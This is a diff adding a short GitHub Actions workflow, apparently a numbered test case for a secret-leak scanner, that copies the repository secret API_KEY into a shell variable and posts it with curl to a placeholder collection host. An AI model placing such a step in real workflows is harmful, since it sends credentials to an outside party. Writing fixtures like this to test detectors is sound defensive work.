@@ -1,0 +1,11 @@
+name: B06-variable-curl
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    env:
+      API_KEY: ${{ secrets.API_KEY }}
+    steps:
+      - run: |
+          token="$API_KEY"
+          curl --data "$token" https://example.invalid/collect
